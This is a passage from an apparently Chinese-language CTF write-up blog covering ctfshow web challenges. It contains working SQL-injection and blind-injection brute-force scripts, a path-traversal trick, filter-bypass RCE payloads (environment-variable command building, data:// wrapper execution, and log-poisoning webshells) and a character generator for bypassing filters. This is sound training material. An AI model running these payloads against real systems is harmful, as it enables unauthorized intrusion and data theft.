$c)));\n    if($d){\n             highlight_file('hint.php');\n             if(filter_var($url[1],FILTER_VALIDATE_URL)){\n                $host=parse_url($url[1]);\n                print_r($host); \n                if(preg_match('/ctfshow\\.com$/',$host['host'])){\n                    print_r(file_get_contents($url[1]));\n                }else{\n                    echo '差点点就成功了！';\n                }\n            }else{\n                echo 'please give me url!!!';\n            }     \n    }else{\n        echo '想一想md5碰撞原理吧?!';\n    }\n}else{\n    echo '第一个都过不了还想要flag呀?!';\n}\n第一个都过不了还想要flag呀?!\n```\n\n先看第一层\n\n## 第一层\n\n```\nif(is_numeric($a) and strlen($a)<7 and $a!=0 and $a**2==0)\n```\n\n限制了$a必须为数字，长度小于7，不能为0且平方后结果为0四个条件\n\n### #浮点数的下溢变为0\n\n考察浮点数的精度溢出，这里是浮点数的下溢，与溢出相反，若结果过于接近于零，但仍为非零值，会导致下溢，通常会表示为接近零的最小值，或者在某些情况下变为零。\n\n```php\n# 浮点数下溢的例子\nd = 1e-308\ne = 1e-308\nf = d * e  # 这里会导致下溢，结果接近于 0\nprint(f)   # 输出: 0.0\n```\n\n传入?a=1e-308就可以了\n\n再看第二层\n\n## 第二层\n\n### #md2碰撞解密\n\n```\n$d = ($b==hash(\"md2\", $b)) && ($c==hash(\"md2\",hash(\"md2\", $c)));\nif($d)\n```\n\n需要$d为非0才能进入if，所以&&两边的条件都需要满足\n\n这里的意思是$b的值经过md2加密后需要和$b原值相等，$c经过两次md2加密后需要和$c原值相等,所以根据强碰撞的原理，一些特殊的数字在hash加密后需要为0e，所以我们需要让$b和$c的值为0e开头的数字\n\n用强碰撞绕过不过去，后来才发现有隐藏目录文件，真的大无语了这种题也会有隐藏文件\n\n![image-20250322113309397](../image/achieve/202411/月饼杯/image-20250322113309397.png)\n\n访问/robots.txt\n\n![image-20250322113358120](../image/achieve/202411/月饼杯/image-20250322113358120.png)\n\n```\nIs it particularly difficult to break MD2?!\nI'll tell you quietly that I saw the payoad of the author.\nBut the numbers are not clear.have fun~~~~\nxxxxx024452    hash(\"md2\",$b)\nxxxxxx48399    hash(\"md2\",hash(\"md2\",$b))\n```\n\n这里给出了部分数字，那么就可以直接爆破了\n\n```php\n<?php\nfor($i=0;$i<999999999999;$i++){\n    $b = hash('md2','0e'.$i.'024452');\n    if(substr($b,0,2) == '0e' and is_numeric($b)){\n        print('$b =0e'.$i.'024452');\n        echo '\\n';\n        break;\n    }\n}\nfor($i=0;$i<999999999999;$i++){\n    $c = hash(\"md2\",hash(\"md2\",'0e'.$i.'48399'));\n    if(substr($c,0,2) == '0e' and is_numeric($c)){\n        print('$c =0e'.$i.'48399');\n        break;\n    }\n}\n//&b=0e652024452\\n&c=0e603448399\n```\n\n传入后显示\n\n```php\n<?php \n$flag=\"flag in /fl0g.txt\";\n```\n\n接下来我们分析第三层\n\n## 第三层\n\n### #file_get_contents伪协议头\n\n```php\nif(filter_var($url[1],FILTER_VALIDATE_URL)){\n                $host=parse_url($url[1]);\n                print_r($host); \n                if(preg_match('/ctfshow\\.com$/',$host['host'])){\n                    print_r(file_get_contents($url[1]));\n                }else{\n                    echo '差点点就成功了！';\n                }\n            }else{\n                echo 'please give me url!!!';\n```\n\n- `filter_var($url[1], FILTER_VALIDATE_URL)`：这行代码用于验证 `$url[1]` 是否是一个有效的 URL。如果 `$url[1]` 是有效的 URL，条件成立，代码块将继续执行。\n- `parse_url($url[1])`：如果 URL 验证通过，这一行将解析 URL，并将其拆分为不同的组成部分（如协议、主机名、路径等）。\n\n这里考察了file_get_contents函数的一个小trick：\n\n**当PHP的 file_get_contents() 函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件**\n\n```php\nurl=suibian://ctfshow.com/../../../../../../../../fl0g.txt\n```\n\n# web3_莫负婵娟\n\n## #密码爆破\n\n## #环境变量构造无字母RCE\n\n***皎洁一年惟此夜，莫教容易负婵娟***\n\n![image-20250323143648011](../image/achieve/202411/月饼杯/image-20250323143648011.png)\n\n一个登录口，存在过滤，先fuzz一下,发现过滤了单双引号和注释字符等\n\n在源码发现了注释内容\n\n```\n<!-- username yu22x -->\n<!-- SELECT * FROM users where username like binary('$username') and password like binary('$password')-->\n```\n\nusername是yu22x，然后对username和password进行了大小写区分，这里发现了like，试着使用模糊匹配去匹配正确的密码但是发现%被过滤了,尝试用反斜杠去逃逸单引号也失败了\n\n后来看到一个思路，是用下划线去匹配单个字符，由此猜测出yu22x用户的password的长度\n\n```py\nimport requests\n\nurl = \"http://245ce338-6ff8-40a1-93e9-bb9ac351a0fa.challenge.ctf.show/login.php\"\n\npwd = \"\"\nfor i in range(1,100):\n    pwd += \"_\"\n    data = {\n        \"username\": \"yu22x\",\n        \"password\": pwd\n    }\n    r =  requests.post(url, data=data)\n    if 'wrong'  not in r.text:\n        print(i)\n//32\n```\n\n所以密码长度是32位，传入32个`_`后显示I have filtered all the characters. Why can you come in? get out!，应该就是判断成功了，那此时我们也是可以爆破密码的，用字符枚举去填充里面的每个下划线`_`中\n\n```py\nimport requests\n\nurl = \"http://245ce338-6ff8-40a1-93e9-bb9ac351a0fa.challenge.ctf.show/login.php\"\n\ndict = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\npwd = \"\"\nfor i in range(1,100):\n    print(\"i = \" + str(i), end = '\\t')\n    for j in dict:\n        password = pwd + j + (32-i) * '_'#一个个去填充\n        data = {\n            \"username\": \"yu22x\",\n            \"password\": password\n        }\n        r =  requests.post(url, data=data)\n        if 'wrong'  not in r.text:\n            pwd += j\n            print(pwd)\n            break\n```\n\n![image-20250323150901056](../image/achieve/202411/月饼杯/image-20250323150901056.png)\n\n密码是67815b0c009ee970fe4014abaa3Fa6A0\n\n传入后跳转至P1099.php\n\n![image-20250323150951080](../image/achieve/202411/月饼杯/image-20250323150951080.png)\n\n命令执行，但是这里的小写字母全部被过滤了，这让我想到了之前的一个思路，就是利用环境变量去进行拼接，这里的话数字没有过滤，用起来就方便很多了\n\n用$PATH去拼接ls\n\n```\nroot@dkhkv28T7ijUp1amAVjh:~# echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\n```\n\n然后进行构造\n\n```\nroot@dkhkv28T7ijUp1amAVjh:~# echo ${PATH:5:1}\nl\nroot@dkhkv28T7ijUp1amAVjh:~# echo ${PATH:5:1}${PATH:11:1}\nls\n```\n\n那我们的payload就是\n\n```\n127.0.0.1;${PATH:5:1}${PATH:11:1}\n等价于\n127.0.0.1;ls\n```\n\n![image-20250323152009316](../image/achieve/202411/月饼杯/image-20250323152009316.png)\n\n然后拼接cat\n\n```\n${PATH:7:2}//ca\n```\n\nt怎么来呢？因为web目录的默认路径是/var/www/html，所以我们用${PWD}\n\n```\nroot@dkhkv28T7ijUp1amAVjh:/var/www/html# echo $PWD\n/var/www/html\nroot@dkhkv28T7ijUp1amAVjh:/var/www/html# echo ${PWD:10:1}\nt\n```\n\n那我们的payload就是\n\n```\n127.0.0.1;${PATH:7:1}${PATH:8:1}${PWD:10:1} ????.???\n```\n\n用nl也是可以的\n\n```\n127.0.0.1;${PATH:14:1}${PATH:5:1} ????.???\n```\n\n但是当时打的时候查看源码看不了，只能抓包看\n\n","tags":["月饼杯"],"categories":["ctfshow"]},{"title":"ctfshow萌新赛(已做完)","url":"/2025/03/18/ctfshow萌新赛(已做完)/","content":"\n## 给她\n\n### #sprintf()函数绕过sql\n\n![image-20250318143508358](../image/achieve/202411/萌新赛/image-20250318143508358.png)\n\n扫目录发现git文件泄露，用Githack扒下来有一个hint.php\n\n```python\nroot@dkhkdmY30sV7Pxs8awAZ:/opt/GitHack# python3 GitHack.py http://9c73dc36-d295-4511-b162-1ce5b1aedad0.challenge.ctf.show/.git/\n[+] Download and parse index file ...\n[+] hint.php\n[OK] hint.php\n```\n\nhint.php\n\n```php\n<?php\n$pass=sprintf(\"and pass='%s'\",addslashes($_GET['pass']));\n$sql=sprintf(\"select * from user where name='%s' $pass\",addslashes($_GET['name']));\n?>\n```\n\n这里的话用addslashes函数对传入的参数进行了一定的字符转义，但是问题是这里对name和pass都使用了这个函数，我们应该怎么去绕过这个反斜杠转义呢？\n\nsprintf()函数就是我们的突破口，毕竟这里就sprintf()函数比较特殊了嘛\n\n先分析一下这个函数的作用\n\n### sprintf()函数\n\n`sprintf()` 函数是 PHP 中用于格式化字符串的一个功能强大的工具。\n\n基础语法\n\n```\nsprintf(format, arg1, arg2, arg++)\n```\n\nformat参数的格式值：\n\n%% - 返回一个百分号 %\n%b - 二进制数\n%c - ASCII 值对应的字符\n%d - 包含正负号的十进制数（负数、0、正数）\n%e - 使用小写的科学计数法（例如 1.2e+2）\n%E - 使用大写的科学计数法（例如 1.2E+2）\n%u - 不包含正负号的十进制数（大于等于 0）\n%f - 浮点数（本地设置）\n%F - 浮点数（非本地设置）\n%g - 较短的 %e 和 %f\n%G - 较短的 %E 和 %f\n%o - 八进制数\n%s - 字符串\n%x - 十六进制数（小写字母）\n%X - 十六进制数（大写字母）\n\n这里的话就是我们C语言中常规的输出函数printf，第一个参数format就是占位符格式化字符，后面的就是参数列表\n\n为什么这里有漏洞呢\n\n![image-20250318145612654](../image/achieve/202411/萌新赛/image-20250318145612654.png)\n\n在官方文档中可以关注到`An integer followed by a dollar sign `$`, to specify which number argument to treat in the conversion.`这句话，意思就是一个数字后面跟着一个dollar美元符号`$`可以用来表示此处的占位符负责处理第几个参数，例如`%1$s`表示的就是该占位符处理第一个参数arg1\n\n但是如果format的类型不是规定的格式值，那么就会变为空\n\n所以总结以下两个点:\n\n- **如果 % 符号多于 arg 参数，则我们必须使用占位符。占位符位于 % 符号之后，由数字和 “$” 组成**\n\n- **如果%1$ + 非arg格式类型，程序会无法识别占位符类型，变为空**\n\n所以我们用这个sprintf函数注入的原理就是通过对format的错误类型让函数替换为空，从而让addslashes函数作用失效\n\n如果我们输入\"%\\\\\"或者\"%1$\\\\\",他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么\"%\\\\\",\"%1$\\\\\"就因为没有经过任何处理而被替换为空。\n\n那我们来看一下怎么实现这一操作\n\n- 无占位符的情况(`%\\`)\n\n```php\n<?php\n$sql=\"select * from user where username='%\\' and 1=1 #';\";\n$user='user';\necho sprintf($sql,$user);\n?>\n//运行结果\nselect * from user where username='' and 1=1 #';\n```\n\n因为这里有百分号所以在sprintf中会被当成是format类型去处理，但是因为`$\\`并不是规定的格式类型，所以这里会被替换成空\n\n- 有占位符的情况(`%1$\\`)\n\n```php\n<?php\n$input = addslashes (\"%1$' and 1=1#\" );\n//用addslashes函数进行了处理\n$b = sprintf (\"AND password='%s'\", $input );\n//对$input与$b进行了拼接\n$sql = sprintf (\"SELECT * FROM user WHERE username='%s' $b \", 'admin' );\n//$sql = sprintf (\"SELECT * FROM user WHERE username='%s' AND password='%1$\\' and 1=1#' \", 'admin' );\n//这个句子里面的\\是由addsashes为了转义单引号而加上的，使用%s与%1$\\类匹配admin，由于%\\是错误的格式类型，那么admin只会出现在%s里，%1$\\则为空\necho  $sql ;\n?>\n//运行结果\n//    SELECT * FROM user WHERE username='admin' AND password='' and 1=1#' \n```\n\n回到题目中，那我们的payload就是\n\n```\n?name=admin&pass=1%1$' or 1=1--+\n```\n\n然后来到一个伪404网站\n\n在源码中发现flag in /flag字样，尝试读取/flag，发现目录穿越也读不了，抓包看看\n\n![image-20250619140124360](../image/achieve/202411/萌新赛/image-20250619140124360.png)\n\n解码发现是16进制，转码后是flag.txt,但是访问了并不是flag，在cookie尝试对file参数任意文件读取\n\n将/flag转十六进制，然后发包就拿到flag了\n\n![image-20250619140251311](../image/achieve/202411/萌新赛/image-20250619140251311.png)\n\n## 签到题\n\n### #system多条命令执行\n\n```php\n<?php \nif(isset($_GET['url'])){\n        system(\"curl https://\".$_GET['url'].\".ctf.show\");\n}else{\n        show_source(__FILE__);\n}\n ?>\n```\n\n一样的，挂后台扫目录,结果发现有/flag文件，访问下载下来就是flag了。。。应该是一种做法，还有一种做法就是利用system函数的多条命令执行\n\n```\n?url=;ls;\n?url=;cat flag;\n```\n\n- 在 `system()` 中，多条命令可以通过分号 `;`、逻辑运算符 `&&`、`||`、管道 `|` 等方式分隔和执行。\n\n## 假赛生\n\n### #sql查询加空格以假乱真\n\n```php\n<?php\nsession_start();\ninclude('config.php');\nif(empty($_SESSION['name'])){\n    show_source(\"index.php\");\n}else{\n    $name=$_SESSION['name'];\n    $sql='select pass from user where name=\"'.$name.'\"';\n    echo $sql.\"<br />\";\n    system('4rfvbgt56yhn.sh');\n    $query=mysqli_query($conn,$sql);\n    $result=mysqli_fetch_assoc($query);\n    if($name==='admin'){\n        echo \"admin!!!!!\".\"<br />\";\n        if(isset($_GET['c'])){\n            preg_replace_callback(\"/\\w\\W*/\",function(){die(\"not allowed!\");},$_GET['c'],1);\n            echo $flag;\n        }else{\n            echo \"you not admin\";\n        }\n    }\n}\n?>\n```\n\n还有一个登录界面和一个注册界面，随便注册后页面会显示注册账号传入后的sql语句\n\n分析源代码，应该是要admin账号登陆，并且c绕过正则表达式传参，才会显示flag。\n\n其实绕过c 的正则很简单，正则表达式匹配任何包含至少一个字母数字字符后跟着非字母数字字符的字符串。这里直接传一个非数字字母字符就行问题在于怎么用admin去登录\n\n用admin注册的话会显示无法注册，尝试用admin+空格去绕过，猜测是在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。\n\n用admin+空格注册后登录并传入?c=空字符就可以拿到flag了\n\n## 萌新记忆\n\n### #布尔盲注\n\n![image-20250318172645619](../image/achieve/202411/萌新赛/image-20250318172645619.png)\n\n扫目录有一个admin路径访问是一个登录口，测试后发现存在用户名枚举，传入admin/1显示密码错误，说明存在admin用户\n\n测试后发现是sql注入，fuzz之后发现大量字符串都过滤了，例如union，select，ascii，用大小写和双写都没绕过去\n\n但是( ) || , substr length这些是没有过滤的，||可以用来绕过or，那就可以打布尔盲注\n\n传入`1' || 'a'<'b`显示密码错误，传入`1' || 'b'<'a`显示用户名/密码错误，说明密码错误是正确回显\n\n但是这里发现有字符长度限制，所以得把空格啥的去掉，不说了直接给payload\n\n```\n'||substr(p,{i},1)<'{j}\n```\n\n直接上脚本\n\n```python\nimport requests \n\ndef password_name(url):\n    password = \"\"\n    letter = '0123456789abcdefghijklmnopqrstuvwxyz'\n    for i in range(1,100):\n        for j in letter:\n            data={\n                \"u\" : f\"'||substr(p,{i},1)<'{j}\",\n                \"p\" : \"1\"\n            }\n            print(data)\n            r = requests.post(url=url,data=data)\n            if \"密码错误\" == r.text:\n                password += chr(ord(j)-1)\n                sign = 1\n                print(password)\n                break\n    \nif __name__==\"__main__\":\n    url = \"http://df0c5d39-915c-44cf-ad52-70a1e7fac6a0.challenge.ctf.show/admin/checklogin.php\"\n    password = password_name(url)\n```\n\n然后拿密码去登录admin账户就行了\n\n## 数学及格了\n\n只有一个URL但是访问不出来\n","tags":["萌新赛"],"categories":["ctfshow"]},{"title":"web入门命令执行篇-ctfshow","url":"/2025/03/17/web入门命令执行篇-ctfshow/","content":"\n# 0x01基础知识\n\n专门写了一个关于RCE和文件包含的总结，所以这里的知识点就删减掉了\n\n## **2.函数**\n\n1.对于PHP，以下是一些可能存在RCE漏洞的函数：\n\nPHP的system()和exec()函数：这些函数用于执行外部命令，如果未对用户输入进行适当的过滤或验证，攻击者可能利用这些函数执行任意命令。\n\nPHP的eval()函数：该函数用于执行字符串作为PHP代码，如果未对用户输入进行适当的过滤或验证，攻击者可以利用此函数执行任意代码。\n\nPHP的create_function()函数：该函数用于动态创建函数，如果未对用户输入进行适当的过滤或验证，攻击者可以利用此函数执行任意代码。\n\n2.对于ASP（Active Server Pages），以下是一些可能存在RCE漏洞的函数：\n\nASP的Run()和Exec()函数：这些函数用于执行外部命令，如果未对用户输入进行适当的过滤或验证，攻击者可能利用这些函数执行任意命令。\n\nASP的ScriptEngine()函数：该函数用于执行VBScript代码，如果未对用户输入进行适当的过滤或验证，攻击者可以利用此函数执行任意代码。\n\n3.对于Java，以下是一些可能存在RCE漏洞的函数：\n\nJava的Runtime.exec()方法：该方法用于执行外部命令，如果未对用户输入进行适当的过滤或验证，攻击者可能利用此方法执行任意命令。\n\nJava的ProcessBuilder类：该类用于构建和执行外部进程，如果未对用户输入进行适当的过滤或验证，攻击者可能利用此类执行任意命令。\n\n4.对于Python，以下是一些可能存在RCE漏洞的函数：\n\nPython的os.system()和subprocess.call()函数：这些函数用于执行外部命令，如果未对用户输入进行适当的过滤或验证，攻击者可能利用这些函数执行任意命令。\n\nPython的eval()和exec()函数：这些函数用于执行字符串作为Python代码，如果未对用户输入进行适当的过滤或验证，攻击者可以利用这些函数执行任意代码。\n\n关于php:\n\nPHP代码执行函数：\n\neval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()、等\n\nPHP命令执行函数：\n\nsystem()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等\n\n## **3.远程命令执行**\n\n### **1.函数**\n\nsystem() 函数允许执行系统命令，并将命令的输出直接打印到标准输出（浏览器或命令行终端）。它的基本语法如下：\n\n**system(string $command, &$output, &$return_var);**\n\n- $command：要执行的命令。\n- $output（可选）：如果提供了这个参数，命令的输出将会被存储在这个数组中，每一行输出作为一个数组元素。\n- $return_var（可选）：如果提供了这个参数，命令执行后的返回状态码将会被存储在这个变量中。\n- （exec() 函数返回命令输出的最后一行。如果你需要获取完整的输出，应该使用 \n\n$output 参数。）\n\n$command 参数是要执行的系统命令。\n\n$output 参数是一个引用，用于存储命令的输出信息。\n\n$return_var 参数是一个引用，用于存储命令的返回值（执行结果）。\n\n除了 system() 函数，还有其他用于执行系统命令的 PHP 函数，例如：\n\nexec() 函数：执行系统命令，并将命令的输出作为一个字符串返回。\n\npassthru() 函数：执行系统命令，并直接将命令的输出发送到标准输出。\n\nshell_exec() 函数：执行系统命令，并将命令的输出作为一个字符串返回。\n\nproc_open() 函数：在一个进程中执行命令，并提供更多的控制和交互选项。\n\n# 0x02题目\n\n## web29\n\n### #绕过flag\n\n```php\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n```\n\n代码分析:\n\n- error_reporting(0)是php中用于关于报错的回显，如果有错误信息，不会直接显示出来。\n- isset()函数是php中检查定义的值中是否为空，如果不为空将会继续，若是为空就执行 highlight_file(**FILE**)用于显示当前文件。\n- !preg_match(\"/flag/i\", $c)函数是检查$c中是否包含flag（不区分大小写）\n\n### **preg_match ()函数**\n\n匹配正则表达式模式，分隔符后的\"i\"标记这是一个大小写不敏感的搜索\n\n模式中的\\b标记一个单词边界，所以只有独立的单词会被匹配，如：\n\n```\nif (preg_match(\"/\\bweb\\b/i\", \"PHP is the web scripting language of choice.\")) ：   True \nif (preg_match(\"/\\bweb\\b/i\", \"PHP is the website scripting language of choice.\")) ：   False\n```\n\n小技巧：如果仅仅想要检查某个字符串是否包含另外一个字符串，不要使用 preg_match() ， 使用 strpos() 会更快。\n\n- eval($c)是将$c当做代码进行执行\n\n这里的话就是\n\npayload:\n\n```\n?c=system(\"ls\");#查看目录\n```\n\n![image-20241202221351137](./../image/achieve/202411/命令执行--ctfshow/image-20241202221351137.png)\n\n```\n?c=system(\"tac%20fla?.php\");\n?c=system(\"tac%20fla*\");\n?c=system(\"tac%20fla\\g.php\");\n```\n\n非预期解\n\n1.写入一句话木马用蚁剑连接\n\n2.函数套用?c=highlight_file(next(array_reverse(scandir(\".\"))));\n\n3.内敛执行?c=echo%20`tac%20fla*`;\n\n4.利用参数输入`?c=eval($_GET[1]);&1=phpinfo();`\n\n5.利用include参数输入?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n\n6.利用cp命令将flag拷贝到别处?c=system(\"cp%20fl*g.php%20a.txt%20\");然后浏览器访问a.txt，读取即可。\n\n## web30\n\n### #绕过system\n\n```php\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n```\n\n其实与上一题的做法是不变的，只是我们需要绕过system去执行命令，这里我们可以用passthru命令函数\n\npayload\n\n```\n?c=passthru(\"ls\");\n?c=passthru(\"tac%20fla*\");\n```\n\n非预期解的话只要不影响到system的话其实都可以正常使用，如果有system的话换成其他的函数就可以了\n\n## web31\n\n### #绕过cat和php\n\n过滤了flag，system，php,cat,sort,shell,'\\.',' ','\\''\n\n```php\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n```\n\n这里我们用${IFS}代替空格\n\npayload\n\n```\n?c=passthru(\"ls\");发现可以回显，证明并没有用过滤双引号\n?c=passthru(\"ca\\t${IFS}fla?????\");\n```\n\n**但语句是错误的，后来看了很多大佬的wp，才知道:**\n\n因为在php里面$是变量的前缀，是一个特殊字符，我们需要转义特殊字符，$则不再表示变量的意思。\n\n注意：上面的$需要用反斜杠进行转义\n\n```\n?c=passthru(\"tac\\\\${IFS}fla*\");\n```\n\n然后可以获取flag\n\n## web32\n\n![image-20241202223226048](./../image/achieve/202411/命令执行--ctfshow/image-20241202223226048-1733149950287-7.png)\n\n这次过滤了更多了，过滤了/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/\n\n再像前几关一样直接输入命令执行不大可能了，因为括号，分号，反引号都被过滤掉了,所以我们这里的话可以用上第一题里面的非预期解去做\n\n### **1.带参数输入**\n\n**?>代替分号**\n\n```\n?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php\n\n?c=include$_GET[1]?>&1=data://text/plain,<?php system(\"tac flag.php\")?>\n```\n\n### **2.日志注入:**\n\n做法:\n\n```\nurl/?c=include$_GET[1]?%3E&1=../../../../var/log/nginx/access.log\n```\n\n/var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可\n\n## web33\n\n![image-20241202223505176](./../image/achieve/202411/命令执行--ctfshow/image-20241202223505176.png)\n\n比web32多过滤了一个双引号,但33和32都是一个解题方法\n\n## web34\n\n![image-20241202223753099](./../image/achieve/202411/命令执行--ctfshow/image-20241202223753099.png)\n\n比web33多过滤了一个冒号，但不影响我们用伪协议\n\n## web35\n\n![image-20241202223810603](./../image/achieve/202411/命令执行--ctfshow/image-20241202223810603.png)\n\n比web34多了<和=，同上\n\n## web36\n\n![image-20241202223826336](./../image/achieve/202411/命令执行--ctfshow/image-20241202223826336.png)\n\n一样的解题方法通杀，只是参数不要写成数字就行了\n\n## web37\n\n### #include包含\n\n![image-20241202224028444](./../image/achieve/202411/命令执行--ctfshow/image-20241202224028444.png)\n\n与前面不同的是，这里加了一个include语句\n\n### **include函数**\n\n**include就是包含文件的函数，把后$c的内容包含进来.**\n\n解题思路:\n\n**这里我们对$c的值应该设为一串php代码**\n\n**利用data伪协议读flag**\n\ndata://，data:// 是一个流封装器（stream wrapper），它允许你读取或写入数据作为文件流，而不是从实际的磁盘文件中，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行\n\n**方法一：**\n\n```\n?c=data://text/plain,<?php echo system('cat fl*');?>\n?c=data://text/plain,<?php%20system('cat fl*');?>\n```\n\n查看源码即可得到flag\n\n**方法二：**使用base64编码\n\n```\n?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n```\n\nbase64解码\n\n```\n<?php system('cat flag.php');?>\n```\n\n查看源码即可得到flag\n\n## web38\n\n![image-20241203112243907](./../image/achieve/202411/命令执行--ctfshow/image-20241203112243907.png)\n\n原理同上一题，多了个php和file过滤,那我们就用data伪协议，但因为php被过滤了，所以我们改一下payload\n\n```\n/?c=data://text/plain,<?=system(\"tac fla*\");?>\n/?c=data://text/plain,<?=`tac fla*`;?>\n```\n\n在PHP中，使用是短标签的写法，等同于\n\n```\n<?php echo ... ?>\n```\n\n当然这里有日志注入也是可以的\n\nnginx的日志文件/var/log/nginx/access.log\n\n```\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n```\n\n查看源代码 或者通过包含日志文件拿shell\n\n## web39\n\n### #**include包含.php**\n\n![image-20241203112712388](./../image/achieve/202411/命令执行--ctfshow/image-20241203112712388.png)\n\n过滤了flag,限制了.php后缀\n\n### **include($c.\".php\");**\n\n 这行代码的作用是将一个PHP文件的内容包含（或插入）到当前执行的脚本中。这里，\n\n$c 是一个变量，它的值会被附加到字符串 \".php\" 之前，从而构成要包含文件的完整路径（或至少是文件名，如果文件位于当前工作目录中）。例如，如果 \n\n$c 的值是 \"header\"，那么 include($c.\".php\"); 实际上会尝试包含并执行名为 header.php 的文件。\n\n我们可以试试伪协议，因为不能带有flag，所以filter协议和php://input也不好用了。data://text/plain, 这样就相当于执行了php语句, .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用\n\n构造payload:\n\n```\n/?c=data://text/plain,<?php%20system(%27tac%20fla*%27);?>\n```\n\n这样就相当于执行了php语句.php\n\n成功获取flag\n\n## web40\n\n### #无参数rce\n\n![image-20241203112906751](./../image/achieve/202411/命令执行--ctfshow/image-20241203112906751.png)\n\n**解题思路:**\n\n查看目录:\n\n```\n?c=var_dump(scandir(pos(localeconv())));\n\n?c=print_r(scandir(current(localeconv())));\n```\n\nflag.php在倒数第二位，然后用show_source输出\n\n**1.?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));**\n\n- **payload1解释**\n\necho：PHP中的输出函数，用于输出字符串或表达式的结果。\n\nhighlight_file：PHP中的函数，用于高亮显示PHP文件的内容。\n\nnext：PHP中的函数，用于将内部指针向前移动到下一个元素。\n\narray_reverse：PHP中的函数，用于反转数组元素的顺序。\n\nscandir：PHP中的函数，用于列出目录中的文件和子目录。\n\npos：PHP中的函数，返回数组中当前元素的键名。\n\nlocaleconv()：PHP中的函数，返回本地化的数字和货币格式信息。\n\n- 具体来说，这段代码的执行流程如下：\n\nlocaleconv()：获取本地化的数字和货币格式信息。\n\npos(localeconv())：获取localeconv()返回数组的键名。\n\nscandir(pos(localeconv()))：列出pos(localeconv())指向的目录中的文件和子目录。\n\narray_reverse(scandir(pos(localeconv())))：反转这些文件和子目录的顺序。\n\nnext(array_reverse(scandir(pos(localeconv()))))：将内部指针移动到下一个元素，即下一个文件或子目录。\n\nhighlight_file(next(array_reverse(scandir(pos(localeconv())))))：高亮显示这个文件的内容。\n\necho：输出这个高亮显示的内容。\n\n**2.`c=eval(next(reset(get_defined_vars())));&1=;system(\"tac%20flag.php\")`;**\n\n- payload2解释：\n\n?c=`eval(next(reset(get_defined_vars())));`：这是GET请求的一部分，其中c参数的值是一个PHP表达式。\n\nget_defined_vars()：这个函数返回当前所有已定义变量的数组，包括局部变量和全局变量。\n\nreset()：这个函数将数组内部指针指向第一个元素，并返回该元素的值。\n\nnext()：这个函数将数组内部指针向前移动一位，并返回当前指针处的元素值。\n\neval()：这个函数执行字符串作为PHP代码。\n\n&1=;system(\"tac%20flag.php\");：这是GET请求的另一部分，尝试通过URL参数执行系统命令。\n\nsystem()：这个函数执行一个shell命令，并将完整的输出返回。\n\n\"tac%20flag.php\"：这里的命令是tac flag.php，tac是反向输出文件内容的Unix命令，%20是URL编码的空格。\n\n这段代码的目的是尝试执行flag.php文件的反向内容。\n\n## web41\n\n### #或运算\n\n![image-20241203113345873](./../image/achieve/202411/命令执行--ctfshow/image-20241203113345873.png)\n\nif(!preg_match('/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i', $c)){  eval(\"echo($c);\");\n\n这段PHP代码的作用是检查变量\n\n$c是否不包含任何数字（0-9）、小写字母（a-z）、以及一系列特殊字符（包括^、+、~、$、[、]、{、}、&、-）。如果变量\n\n$c不包含这些字符中的任何一个，那么它将执行eval(\"echo($c);\");语句。\n\n这个题过滤了$、+、-、^、~使得**异或自增和取反**构造字符都无法使用，同时过滤了字母和数字。但是特意留了个（或运算符）|\n\n思路如下：\n\n- 首先对ascii从0-255所有字符中筛选出未被过滤的字符，然后两两进行或运算，存储结果。\n- 跟据题目要求，构造payload的原型，并将原型替换为或运算的结果\n- 使用POST请求发送c,获取flag\n\n1.方法一\n\n采用了大佬的脚本\n\n**rce_or.php**\n\n```php\n<?php\n$myfile = fopen(\"rce_or.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i < 256; $i++) { \n    for ($j=0; $j <256 ; $j++) { \n\n        if($i<16){\n            $hex_i='0'.dechex($i);\n        }\n        else{\n            $hex_i=dechex($i);\n        }\n        if($j<16){\n            $hex_j='0'.dechex($j);\n        }\n        else{\n            $hex_j=dechex($j);\n        }\n        $preg = '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i';//绕过的运算符\n        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n                    echo \"\";\n    }\n  \n        else{\n        $a='%'.$hex_i;\n        $b='%'.$hex_j;\n        $c=(urldecode($a)|urldecode($b));\n        if (ord($c)>=32&ord($c)<=126) {\n            $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n        }\n    